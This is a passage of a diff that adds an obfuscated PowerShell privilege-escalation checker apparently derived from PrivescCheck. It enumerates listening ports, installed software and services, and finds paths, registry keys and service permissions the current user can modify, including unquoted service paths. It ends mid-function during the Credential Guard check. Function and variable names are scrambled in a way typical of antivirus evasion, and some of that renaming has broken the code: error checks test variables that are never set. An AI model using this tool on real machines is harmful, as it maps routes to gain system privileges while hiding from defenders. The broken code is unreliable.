+                    $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TNDssRLn99, [type] [PrivescCheck.Win32+MIB_UDPTABLE_OWNER_PID])
+                } elseif ($iOaZLlEh99 -eq $DmTbLZpL99) { 
+                    $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TNDssRLn99, [type] [PrivescCheck.Win32+MIB_UDP6TABLE_OWNER_PID])
+                }
+            } else {
+                if ($iOaZLlEh99 -eq $kAyZAaab99) { 
+                    $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TNDssRLn99, [type] [PrivescCheck.Win32+MIB_TCPTABLE_OWNER_PID])
+                } elseif ($iOaZLlEh99 -eq $DmTbLZpL99) { 
+                    $Table = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TNDssRLn99, [type] [PrivescCheck.Win32+MIB_TCP6TABLE_OWNER_PID])
+                }
+            }
+            
+            $GkhpyOlZ99 = $Table.dwNumEntries
+            Write-Verbose "GetExtendedProtoTable() OK - NumEntries: $GkhpyOlZ99"
+            $mAvHuZEW99 = [IntPtr] ($TNDssRLn99.ToInt64() + 4)
+            For ($i = 0; $i -lt $GkhpyOlZ99; $i++) {
+                if ($UDP) {
+                    if ($iOaZLlEh99 -eq $kAyZAaab99) {
+                        $NIqKRyhI99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($mAvHuZEW99, [type] [PrivescCheck.Win32+MIB_UDPROW_OWNER_PID])
+                        $vHIMvYkR99 = (New-Object -TypeName System.Net.IPAddress($NIqKRyhI99.localAddr)).IPAddressToString
+                    } elseif ($iOaZLlEh99 -eq $DmTbLZpL99) {
+                        $NIqKRyhI99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($mAvHuZEW99, [type] [PrivescCheck.Win32+MIB_UDP6ROW_OWNER_PID])
+                        $vHIMvYkR99 = New-Object -TypeName System.Net.IPAddress($NIqKRyhI99.localAddr, $NIqKRyhI99.localScopeId)
+                    }
+                } else {
+                    if ($iOaZLlEh99 -eq $kAyZAaab99) {
+                        $NIqKRyhI99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($mAvHuZEW99, [type] [PrivescCheck.Win32+MIB_TCPROW_OWNER_PID])
+                        $vHIMvYkR99 = (New-Object -TypeName System.Net.IPAddress($NIqKRyhI99.localAddr)).IPAddressToString
+                    } elseif ($iOaZLlEh99 -eq $DmTbLZpL99) {
+                        $NIqKRyhI99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($mAvHuZEW99, [type] [PrivescCheck.Win32+MIB_TCP6ROW_OWNER_PID])
+                        $vHIMvYkR99 = New-Object -TypeName System.Net.IPAddress($NIqKRyhI99.localAddr, $NIqKRyhI99.localScopeId)
+                    }
+                }
+                $vwtUFgTe99 = $NIqKRyhI99.localPort[0] * 0x100 + $NIqKRyhI99.localPort[1]
+                $ITXypsVd99 = $NIqKRyhI99.owningPid
+                if ($iOaZLlEh99 -eq $kAyZAaab99) {
+                    $BHmqmHgo99 = "$($vHIMvYkR99):$($vwtUFgTe99)"
+                } elseif ($iOaZLlEh99 -eq $DmTbLZpL99) {
+                    $BHmqmHgo99 = "[$($vHIMvYkR99)]:$($vwtUFgTe99)"
+                }
+                $DsaTetIT99 = New-Object -TypeName PSObject 
+                $DsaTetIT99 | Add-Member -MemberType "NoteProperty" -Name "IP" -Value $(if ($iOaZLlEh99 -eq $kAyZAaab99) { "IPv4" } else { "IPv6" } )
+                $DsaTetIT99 | Add-Member -MemberType "NoteProperty" -Name "Proto" -Value $(if ($UDP) { "UDP" } else { "TCP" } )
+                $DsaTetIT99 | Add-Member -MemberType "NoteProperty" -Name "LocalAddress" -Value $vHIMvYkR99
+                $DsaTetIT99 | Add-Member -MemberType "NoteProperty" -Name "LocalPort" -Value $vwtUFgTe99
+                $DsaTetIT99 | Add-Member -MemberType "NoteProperty" -Name "Endpoint" -Value $BHmqmHgo99
+                $DsaTetIT99 | Add-Member -MemberType "NoteProperty" -Name "State" -Value $(if ($UDP) { "N/A" } else { "LISTENING" } )
+                $DsaTetIT99 | Add-Member -MemberType "NoteProperty" -Name "PID" -Value $ITXypsVd99
+                $DsaTetIT99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value (Get-Process -PID $ITXypsVd99).ProcessName
+                $DsaTetIT99
+                $mAvHuZEW99 = [IntPtr] ($mAvHuZEW99.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf($NIqKRyhI99))
+            }
+        } else {
+            Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+        }
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TNDssRLn99)
+    } else {
+        Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+    }
+}
+function ampere {
+    
+    [CmdletBinding()] param(
+        [switch]
+        $ovMLtgnb99 = $False
+    )
+    $VGapCenE99 = @("Common Files", "Internet Explorer", "ModifiableWindowsApps", "PackageManagement", "Windows Defender", "Windows Defender Advanced Threat Protection", "Windows Mail", "Windows Media Player", "Windows Multimedia Platform", "Windows NT", "Windows Photo Viewer", "Windows Portable Devices", "Windows Security", "WindowsPowerShell", "Microsoft.NET", "Windows Portable Devices", "dotnet", "MSBuild", "Intel", "Reference Assemblies")
+    $jfITQKHd99 = New-Object System.Collections.ArrayList
+    $BRrJNptz99 = New-Object System.Collections.ArrayList
+    $oVCjOhOg99 = Join-Path -Path $env:SystemDrive -ChildPath "Program Files (x86)"
+    $bTbKRoSk99 = Join-Path -Path $env:SystemDrive -ChildPath "Program Files" 
+    $Items = Get-ChildItem -Path $oVCjOhOg99,$bTbKRoSk99 -ErrorAction SilentlyContinue
+    if ($Items) {
+        [void]$BRrJNptz99.AddRange($Items)
+    }
+    
+    $AstQoFmy99 = Get-ChildItem -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" 
+    $oQNNPhsR99 = Get-ChildItem -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" -ErrorAction SilentlyContinue
+    if ($oQNNPhsR99) { $AstQoFmy99 += $oQNNPhsR99 }
+    ForEach ($rJrJtlZD99 in $AstQoFmy99) {
+        $iKtqGPrK99 = [System.Environment]::ExpandEnvironmentVariables($rJrJtlZD99.GetValue("InstallLocation"))
+        if ($iKtqGPrK99) {
+            if (Test-Path -Path $iKtqGPrK99 -ErrorAction SilentlyContinue) {
+                if ($iKtqGPrK99[$iKtqGPrK99.Length - 1] -eq "\") {
+                    $iKtqGPrK99 = $iKtqGPrK99.SubString(0, $iKtqGPrK99.Length - 1)
+                }
+                $lbWPYrcI99 = Get-Item -Path $iKtqGPrK99 -ErrorAction SilentlyContinue -ErrorVariable GetItemError 
+                if ($qyoYBwIV99) {
+                    continue 
+                }
+                if ($lbWPYrcI99 -is [System.IO.DirectoryInfo]) {
+                    continue
+                }
+                [void]$BRrJNptz99.Add([object]$lbWPYrcI99)
+            }
+        }
+    }
+    $RgcBZmFU99 = New-Object System.Collections.ArrayList
+    ForEach ($rJrJtlZD99 in $BRrJNptz99) {
+        if (-not ($RgcBZmFU99 -contains $rJrJtlZD99.FullName)) {
+            [void]$jfITQKHd99.Add($rJrJtlZD99)
+            [void]$RgcBZmFU99.Add($rJrJtlZD99.FullName)
+        }
+    }
+    if ($ovMLtgnb99) {
+        $fAXZAchf99 = New-Object -TypeName System.Collections.ArrayList
+        ForEach ($rJrJtlZD99 in $jfITQKHd99) {
+            if (-Not ($VGapCenE99 -contains $rJrJtlZD99.Name)) {
+                [void]$fAXZAchf99.Add($rJrJtlZD99)
+            }
+        }
+        $fAXZAchf99
+    } else {
+        $jfITQKHd99
+    }
+}
+function swindles {
+    [CmdletBinding()] param(
+        [string]$Name
+    )
+    $YcLhmHOw99 = "HKLM\SYSTEM\CurrentControlSet\Services" 
+    $SxiJOPVm99 = Join-Path -Path $YcLhmHOw99 -ChildPath $Name
+    $SKRqNCky99 = Get-ItemProperty -Path "Registry::$SxiJOPVm99" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
+    if (-not $EXIfkazW99) {
+        $DqpwXaiL99 = [System.Environment]::ExpandEnvironmentVariables($SKRqNCky99.DisplayName)
+        $MvURoNoO99 = New-Object -TypeName PSObject 
+        $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $SKRqNCky99.PSChildName
+        $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value $DqpwXaiL99
+        $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "User" -Value $SKRqNCky99.ObjectName 
+        $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $SKRqNCky99.ImagePath 
+        $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "StartMode" -Value $(Orion -nWlfWoqT99 $SKRqNCky99.Start)
+        $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $(youth -UoUwjeQj99 $LsjTNVxz99.Type)
+        $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "RegistryKey" -Value $SKRqNCky99.Name
+        $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "RegistryPath" -Value $SKRqNCky99.PSPath
+        $MvURoNoO99
+    }
+}
+function booty {
+    
+    [CmdletBinding()] param(
+        [Parameter(Mandatory=$true)]
+        [ValidateSet(0,1,2,3)]
+        [int]
+        $AJMSSkMr99
+    )
+    if ($rqDNGvcC99.Count -eq 0) {
+        $YcLhmHOw99 = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services" 
+        $nPeVPBTk99 = Get-ChildItem -Path $YcLhmHOw99 -ErrorAction SilentlyContinue
+        ForEach ($pVkCsHgj99 in $nPeVPBTk99) {
+            $LsjTNVxz99 = Get-ItemProperty -Path $pVkCsHgj99.PSPath -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
+            if ($EXIfkazW99) {
+                continue 
+            }
+            $DqpwXaiL99 = [System.Environment]::ExpandEnvironmentVariables($LsjTNVxz99.DisplayName)
+            $MvURoNoO99 = New-Object -TypeName PSObject 
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $LsjTNVxz99.PSChildName
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "DisplayName" -Value $DqpwXaiL99
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "User" -Value $LsjTNVxz99.ObjectName 
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "ImagePath" -Value $LsjTNVxz99.ImagePath 
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "StartMode" -Value $(Orion -nWlfWoqT99 $LsjTNVxz99.Start)
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "Type" -Value $(youth -UoUwjeQj99 $LsjTNVxz99.Type)
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "RegistryKey" -Value $pVkCsHgj99.Name
+            $MvURoNoO99 | Add-Member -MemberType "NoteProperty" -Name "RegistryPath" -Value $pVkCsHgj99.PSPath 
+            [void] $rqDNGvcC99.Add($MvURoNoO99)
+        }
+    }
+    ForEach ($MvURoNoO99 in $rqDNGvcC99) {
+        if ($AJMSSkMr99 -eq 0) {
+            $MvURoNoO99
+            continue 
+        }
+        if ($MvURoNoO99.ImagePath -and (-not ($MvURoNoO99.ImagePath.trim() -eq ''))) {
+            if ($AJMSSkMr99 -le 1) {
+                $MvURoNoO99
+                continue 
+            }
+            if (@("Win32OwnProcess", "Win32ShareProcess", "InteractiveProcess") -contains $MvURoNoO99.Type) {
+                if ($AJMSSkMr99 -le 2) {
+                    $MvURoNoO99
+                    continue
+                }
+                if (-not (throes -ghiDMOMF99 $MvURoNoO99)) {
+                    if ($AJMSSkMr99 -le 3) {
+                        $MvURoNoO99
+                        continue
+                    }
+                }
+            }
+        }
+    }
+}
+function ruined {
+    
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
+        [Alias('FullName')]
+        [String[]]
+        $Path,
+        [Switch]
+        $loyqyiRW99
+    )
+    BEGIN {
+        $AccessMask = @{
+            [uint32]'0x80000000' = 'GenericRead'
+            [uint32]'0x40000000' = 'GenericWrite'
+            [uint32]'0x20000000' = 'GenericExecute'
+            [uint32]'0x10000000' = 'GenericAll'
+            [uint32]'0x02000000' = 'MaximumAllowed'
+            [uint32]'0x01000000' = 'AccessSystemSecurity'
+            [uint32]'0x00100000' = 'Synchronize'
+            [uint32]'0x00080000' = 'WriteOwner'
+            [uint32]'0x00040000' = 'WriteDAC'
+            [uint32]'0x00020000' = 'ReadControl'
+            [uint32]'0x00010000' = 'Delete'
+            [uint32]'0x00000100' = 'WriteAttributes'
+            [uint32]'0x00000080' = 'ReadAttributes'
+            [uint32]'0x00000040' = 'DeleteChild'
+            [uint32]'0x00000020' = 'Execute/Traverse'
+            [uint32]'0x00000010' = 'WriteExtendedAttributes'
+            [uint32]'0x00000008' = 'ReadExtendedAttributes'
+            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
+            [uint32]'0x00000002' = 'WriteData/AddFile'
+            [uint32]'0x00000001' = 'ReadData/ListDirectory'
+        }
+        $evTqfAvT99 = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+        $ZMcquVkc99 = $evTqfAvT99.Groups | Select-Object -ExpandProperty Value
+        $ZMcquVkc99 += $evTqfAvT99.User.Value
+        $SpKiVjmp99 = @{}
+    }
+    PROCESS {
+        ForEach($DTbJkTFp99 in $Path) {
+            $tzkhTdnZ99 = @()
+            $wAaVPJip99 = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")
+            if($PSBoundParameters['LiteralPaths']) {
+                $TRNcYDwm99 = $([System.Environment]::ExpandEnvironmentVariables($DTbJkTFp99))
+                if(Test-Path -Path $TRNcYDwm99 -ErrorAction SilentlyContinue) {
+                    $tzkhTdnZ99 += Resolve-Path -Path $TRNcYDwm99 | Select-Object -ExpandProperty Path
+                }
+                else {
+                    try {
+                        $jwJpmgcV99 = Split-Path $TRNcYDwm99 -Parent
+                        if($jwJpmgcV99 -and (Test-Path -Path $jwJpmgcV99 -ErrorAction SilentlyContinue)) {
+                            $tzkhTdnZ99 += Resolve-Path -Path $jwJpmgcV99 -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
+                        }
+                    }
+                    catch {
+                    }
+                }
+            }
+            else {
+                $DTbJkTFp99 = $([System.Environment]::ExpandEnvironmentVariables($DTbJkTFp99)).Trim()
+                
+                ForEach($pHePrZgT99 in $wAaVPJip99) {
+                    $DTbJkTFp99.Split($pHePrZgT99) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {
+                        if (-not ($_ -match "^[A-Z]:`$")) {
+                            if($pHePrZgT99 -notmatch ' ') {
+                                $TRNcYDwm99 = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()
+    
+                                if ((-not ($TRNcYDwm99 -Like "/*")) -and (-not ($TRNcYDwm99 -match "^[A-Z]:`$"))) { 
+    
+                                    if($TRNcYDwm99 -and ($TRNcYDwm99 -ne '')) {
+                                        if (Test-Path -Path $TRNcYDwm99 -ErrorAction SilentlyContinue) {
+                                            $tzkhTdnZ99 += Resolve-Path -Path $TRNcYDwm99 | Select-Object -ExpandProperty Path
+                                        } else {
+                                            try {
+                                                $jwJpmgcV99 = (Split-Path -Path $TRNcYDwm99 -Parent -ErrorAction SilentlyContinue).Trim()
+                                                if ($jwJpmgcV99 -and ($jwJpmgcV99 -ne '') -and (Test-Path -Path $jwJpmgcV99 -ErrorAction SilentlyContinue)) {
+                                                    $tzkhTdnZ99 += Resolve-Path -Path $jwJpmgcV99 | Select-Object -ExpandProperty Path
+                                                }
+                                            } catch {
+                                            }
+                                        }
+                                    }
+                                }
+                            } else {
+                                $tzkhTdnZ99 += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
+                            }
+                        } else {
+                            Write-Verbose "DEBUG: Got a drive letter as a path: $_"
+                        }
+                    }
+                }
+            }
+            $tzkhTdnZ99 | Sort-Object -Unique | ForEach-Object {
+                $MqKMdAme99 = $_
+                try {
+                
+                    Get-Acl -Path $MqKMdAme99 | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
+                        $EOCEhCAc99 = $_.FileSystemRights.value__
+                        $dyoofDjS99 = $AccessMask.Keys | Where-Object { $EOCEhCAc99 -band $_ } | ForEach-Object { $accessMask[$_] }
+                        $zooqTFCG99 = Compare-Object -ReferenceObject $dyoofDjS99 -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent
+                        if($zooqTFCG99) {
+                            if ($_.IdentityReference -notmatch '^S-1-5.*' -and $_.IdentityReference -notmatch '^S-1-15-.*') {
+                                if(-not ($SpKiVjmp99[$_.IdentityReference])) {
+                                    $QpHMvNdj99 = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
+                                    $SpKiVjmp99[$_.IdentityReference] = $QpHMvNdj99.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
+                                }
+                                $WtlhxzHE99 = $SpKiVjmp99[$_.IdentityReference]
+                            }
+                            else {
+                                $WtlhxzHE99 = $_.IdentityReference
+                            }
+                            if($ZMcquVkc99 -contains $WtlhxzHE99) {
+                                New-Object -TypeName PSObject -Property @{
+                                    ModifiablePath = $MqKMdAme99
+                                    IdentityReference = $_.IdentityReference
+                                    Permissions = $dyoofDjS99
+                                }
+                            }
+                        }
+                    }
+                } catch {
+                }
+            }
+        }
+    }
+}
+function Congress {
+    [CmdletBinding()] param(
+        [string] $Path
+    )
+    $UWphFqVq99 = @("WriteData/AddFile", "DeleteChild", "WriteDAC", "WriteOwner")
+    $bxeNQxEF99 = @("AppendData/AddSubdirectory", "DeleteChild", "WriteDAC", "WriteOwner")
+    if (-not ($Path.StartsWith("`"") -or $Path.StartsWith("'"))) {
+                
+        $cFXEJdSh99 = $Path.SubString(0, $Path.ToLower().IndexOf(".exe") + 4)
+        If ($cFXEJdSh99 -match ".* .*") {
+            $cFXEJdSh99.split(' ') | ruined | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
+                
+                $TRNcYDwm99 = $([System.Environment]::ExpandEnvironmentVariables($cFXEJdSh99))
+                $TRNcYDwm99 = Split-Path -Path $TRNcYDwm99 -Parent 
+                while ($TRNcYDwm99) 
+                {
+                    try {
+                        $jwJpmgcV99 = Split-Path -Path $TRNcYDwm99 -Parent 
+                        if ($jwJpmgcV99 -eq $_.ModifiablePath) {
+                            $nuNRyqXV99 = $Null 
+                            if (Test-Path -Path $TRNcYDwm99 -ErrorAction SilentlyContinue) {
+                                $nuNRyqXV99 = $UWphFqVq99
+                            } else {
+                                $nuNRyqXV99 = $bxeNQxEF99 
+                            }
+                            ForEach ($oyHtroOY99 in $_.Permissions) {
+                                if ($nuNRyqXV99 -contains $oyHtroOY99) {
+                                    $_
+                                }
+                            }
+                            break
+                        }
+                    } catch {
+                        break 
+                    }
+                    $TRNcYDwm99 = $jwJpmgcV99
+                }
+            }
+        }
+    }
+}
+function transference {
+    
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
+        [String[]]
+        $Path
+    )
+    BEGIN {
+        $AccessMask = @{
+            [uint32]'0x80000000' = 'GenericRead'
+            [uint32]'0x40000000' = 'GenericWrite'
+            [uint32]'0x20000000' = 'GenericExecute'
+            [uint32]'0x10000000' = 'GenericAll'
+            [uint32]'0x02000000' = 'MaximumAllowed'
+            [uint32]'0x01000000' = 'AccessSystemSecurity'
+            [uint32]'0x00100000' = 'Synchronize'
+            [uint32]'0x00080000' = 'WriteOwner'
+            [uint32]'0x00040000' = 'WriteDAC'
+            [uint32]'0x00020000' = 'ReadControl'
+            [uint32]'0x00010000' = 'Delete'
+            [uint32]'0x00000100' = 'WriteAttributes'
+            [uint32]'0x00000080' = 'ReadAttributes'
+            [uint32]'0x00000040' = 'DeleteChild'
+            [uint32]'0x00000020' = 'Execute/Traverse'
+            [uint32]'0x00000010' = 'WriteExtendedAttributes'
+            [uint32]'0x00000008' = 'ReadExtendedAttributes'
+            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
+            [uint32]'0x00000002' = 'WriteData/AddFile'
+            [uint32]'0x00000001' = 'ReadData/ListDirectory'
+        }
+        $evTqfAvT99 = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+        $ZMcquVkc99 = $evTqfAvT99.Groups | Select-Object -ExpandProperty Value
+        $ZMcquVkc99 += $evTqfAvT99.User.Value
+        $SpKiVjmp99 = @{}
+    }
+    PROCESS {
+        $zcFufryX99 = Get-Acl -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetAclError
+        if (-not $BafqGPrQ99) {
+            $zcFufryX99 | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {
+                $krJPSpPr99 = $_.RegistryRights.value__
+                $dyoofDjS99 = $AccessMask.Keys | Where-Object { $krJPSpPr99 -band $_ } | ForEach-Object { $accessMask[$_] }
+                $zooqTFCG99 = Compare-Object -ReferenceObject $dyoofDjS99 -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent
+                if($zooqTFCG99) {
+                    if ($_.IdentityReference -notmatch '^S-1-5.*') {
+                        if(-not ($SpKiVjmp99[$_.IdentityReference])) {
+                            $QpHMvNdj99 = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
+                            $SpKiVjmp99[$_.IdentityReference] = $QpHMvNdj99.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
+                        }
+                        $WtlhxzHE99 = $SpKiVjmp99[$_.IdentityReference]
+                    }
+                    else {
+                        $WtlhxzHE99 = $_.IdentityReference
+                    }
+                    if($ZMcquVkc99 -contains $WtlhxzHE99) {
+                        New-Object -TypeName PSObject -Property @{
+                            ModifiablePath = $Path
+                            IdentityReference = $_.IdentityReference
+                            Permissions = $dyoofDjS99
+                        }
+                    }
+                }
+            }
+        }
+    } 
+}
+function someway {
+    [OutputType('ServiceProcess.ServiceController')]
+    param (
+        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
+        [Alias('ServiceName')]
+        [String[]]
+        [ValidateNotNullOrEmpty()]
+        $Name
+    )
+    BEGIN {
+        filter Local:Get-ServiceReadControlHandle {
+            [OutputType([IntPtr])]
+            param (
+                [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
+                [ValidateNotNullOrEmpty()]
+                [ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
+                $ghiDMOMF99
+            )
+            Add-Type -AssemblyName System.ServiceProcess # ServiceProcess is not loaded by default  
+            $apqRhYQZ99 = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
+            $SnQVsHIv99 = 0x00020000
+            $wDASRVum99 = $apqRhYQZ99.Invoke($ghiDMOMF99, @($SnQVsHIv99))
+            $wDASRVum99
+        }
+    }
+    PROCESS {
+        ForEach($tlNKEszk99 in $Name) {
+            $TnoFDDCU99 = Get-Service -Name $tlNKEszk99 -ErrorAction SilentlyContinue -ErrorVariable GetServiceError
+            if (-not $xWeBrtGF99) {
+                try {
+                    $CjnUUtOr99 = Get-ServiceReadControlHandle -ghiDMOMF99 $TnoFDDCU99
+                }
+                catch {
+                    $CjnUUtOr99 = $Null
+                }
+                if ($CjnUUtOr99 -and ($CjnUUtOr99 -ne [IntPtr]::Zero)) {
+                    $wvloTDAb99 = 0
+                    $XwsMixSg99 = [PrivescCheck.Win32]::QueryServiceObjectSecurity($CjnUUtOr99, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $wvloTDAb99)
+                    $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                    if ((-not $XwsMixSg99) -and ($UoLxMgJM99 -eq 122) -and ($wvloTDAb99 -gt 0)) {
+                        $dJxGHrRG99 = New-Object Byte[]($wvloTDAb99)
+                        $XwsMixSg99 = [PrivescCheck.Win32]::QueryServiceObjectSecurity($CjnUUtOr99, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $dJxGHrRG99, $dJxGHrRG99.Count, [Ref] $wvloTDAb99)
+                        $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                        if ($XwsMixSg99) {
+                            
+                            $qrWyzFSY99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $dJxGHrRG99, 0
+                            $Dacl = $qrWyzFSY99.DiscretionaryAcl | ForEach-Object {
+                                Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value $([PrivescCheck.Win32+ServiceAccessFlags] $_.AccessMask) -PassThru
+                            }
+                            Add-Member -InputObject $TnoFDDCU99 -MemberType NoteProperty -Name Dacl -Value $Dacl -PassThru
+                        }
+                    }
+                    $Null = [PrivescCheck.Win32]::CloseServiceHandle($CjnUUtOr99)
+                }
+            }
+        }
+    }
+}
+function shade {
+    [CmdletBinding()]Param()
+    $QGgQyZuh99 = [System.Environment]::OSVersion.Version
+    if (($QGgQyZuh99.Major -ge 10) -or (($QGgQyZuh99.Major -ge 6) -and ($QGgQyZuh99.Minor -ge 2))) {
+        [int]$mzTsevAk99 = 0
+        $XwsMixSg99 = [PrivescCheck.Win32]::GetFirmwareType([ref]$mzTsevAk99)
+        $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        if ($XwsMixSg99 -gt 0) {
+            if ($mzTsevAk99 -eq 1) {
+                $PGwQfWGS99 = $False 
+                $SSwKgPSl99 = "BIOS mode is Legacy"
+            } elseif ($mzTsevAk99 -eq 2) {
+                $PGwQfWGS99 = $True 
+                $SSwKgPSl99 = "BIOS mode is UEFI"
+            } else {
+                $SSwKgPSl99 = "BIOS mode is unknown"
+            }
+        } else {
+            Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+        }
+    } elseif (($QGgQyZuh99.Major -eq 6) -and ($QGgQyZuh99.Minor -eq 1)) {
+        [PrivescCheck.Win32]::GetFirmwareEnvironmentVariable("", "{00000000-0000-0000-0000-000000000000}", [IntPtr]::Zero, 0) | Out-Null 
+        $UoLxMgJM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+    
+        $PHuofHSw99 = 1
+        if ($UoLxMgJM99 -eq $PHuofHSw99) {
+            $PGwQfWGS99 = $False 
+            $SSwKgPSl99 = "BIOS mode is Legacy"
+            Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+        } else {
+            $PGwQfWGS99 = $True 
+            $SSwKgPSl99 = "BIOS mode is UEFI"
+            Write-Verbose ([ComponentModel.Win32Exception] $UoLxMgJM99)
+        }
+        
+    } else {
+        $SSwKgPSl99 = "Cannot check BIOS mode"
+    }
+    $zEiGjxfq99 = New-Object -TypeName PSObject
+    $zEiGjxfq99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value "UEFI"
+    $zEiGjxfq99 | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $PGwQfWGS99
+    $zEiGjxfq99 | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $SSwKgPSl99
+    $zEiGjxfq99
+}
+function gals {
+    
+    [CmdletBinding()]Param()
+    $XtIMwCTj99 = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecureBoot\State"
+    $XwsMixSg99 = Get-ItemProperty -Path "Registry::$($XtIMwCTj99)" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
+    if (-not $EXIfkazW99) {
+        if (-not ($Null -eq $XwsMixSg99.UEFISecureBootEnabled)) {
+            if ($XwsMixSg99.UEFISecureBootEnabled -eq 1) {
+                $PGwQfWGS99 = $True
+                $SSwKgPSl99 = "Secure Boot is enabled"
+            } else {
+                $PGwQfWGS99 = $False
+                $SSwKgPSl99 = "Secure Boot is disabled"
+            }
+        } else {
+            $PGwQfWGS99 = $False
+            $SSwKgPSl99 = "Secure Boot is not supported"
+        }
+    } else {
+        $PGwQfWGS99 = $False
+        $SSwKgPSl99 = "Secure Boot is not supported"
+    }
+    $pgWorbJg99 = New-Object -TypeName PSObject
+    $pgWorbJg99 | Add-Member -MemberType "NoteProperty" -Name "Name" -Value "Secure Boot"
+    $pgWorbJg99 | Add-Member -MemberType "NoteProperty" -Name "Status" -Value $PGwQfWGS99
+    $pgWorbJg99 | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $SSwKgPSl99
+    $pgWorbJg99
+}
+function foreshadowed {
+    
+    [CmdletBinding()]Param()
+    $QGgQyZuh99 = [System.Environment]::OSVersion.Version
+    if ($QGgQyZuh99.Major -ge 10) {
+        
+        if (((Get-ComputerInfo).DeviceGuardSecurityServicesConfigured) -match 'CredentialGuard') {
+            $PGwQfWGS99 = $False
+            $SSwKgPSl99 = "Credential Guard is configured but is not running"
+            if (((Get-ComputerInfo).DeviceGuardSecurityServicesRunning) -match 'CredentialGuard') {
+                $PGwQfWGS99 = $True
+                $SSwKgPSl99 = "Credential Guard is configured and running"
+            }
